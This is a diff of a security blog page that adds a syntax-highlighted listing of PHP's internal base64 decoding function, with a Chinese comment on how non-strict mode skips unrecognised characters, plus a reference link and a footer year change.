+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">base64_pad</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="cm">/* fail if the padding character is second in a group (like V===) */</span>
+</span></span><span class="line"><span class="cl">			<span class="cm">/* FIXME: why do we still allow invalid padding in other places in the middle of the string? */</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nf">zend_string_free</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="n">padding</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="n">ch</span> <span class="o">=</span> <span class="n">base64_reverse_table</span><span class="p">[</span><span class="n">ch</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strict</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="cm">/* skip unknown characters and whitespace */</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="cm">/* skip whitespace */</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="cm">/* fail on bad characters or if any data follows padding */</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="o">-</span><span class="mi">2</span> <span class="o">||</span> <span class="n">padding</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nf">zend_string_free</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">switch</span><span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">ZSTR_VAL</span><span class="p">(</span><span class="n">result</span><span class="p">)[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">ch</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">ZSTR_VAL</span><span class="p">(</span><span class="n">result</span><span class="p">)[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">|=</span> <span class="n">ch</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">ZSTR_VAL</span><span class="p">(</span><span class="n">result</span><span class="p">)[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ch</span> <span class="o">&amp;</span> <span class="mh">0x0f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">ZSTR_VAL</span><span class="p">(</span><span class="n">result</span><span class="p">)[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">|=</span> <span class="n">ch</span> <span class="o">&gt;&gt;</span><span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">ZSTR_VAL</span><span class="p">(</span><span class="n">result</span><span class="p">)[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ch</span> <span class="o">&amp;</span> <span class="mh">0x03</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">ZSTR_VAL</span><span class="p">(</span><span class="n">result</span><span class="p">)[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">|=</span> <span class="n">ch</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="n">i</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">ZSTR_LEN</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">ZSTR_VAL</span><span class="p">(</span><span class="n">result</span><span class="p">)[</span><span class="nf">ZSTR_LEN</span><span class="p">(</span><span class="n">result</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>其中 28-43 行涉及严格模式的处理，当前字符无法识别且严格模式为<code>false</code>，会<code>continue</code>忽略</p>
+</blockquote>
 <h1 id="ref">Ref</h1>
 <p><a class="link" href="https://www.freebuf.com/articles/web/266565.html"  target="_blank" rel="noopener"
     >https://www.freebuf.com/articles/web/266565.html</a></p>
@@ -474,7 +1033,7 @@
         
             2020 - 
         
-        2024 DanSec
+        2025 DanSec
     </section>
     
     <section class="powerby">
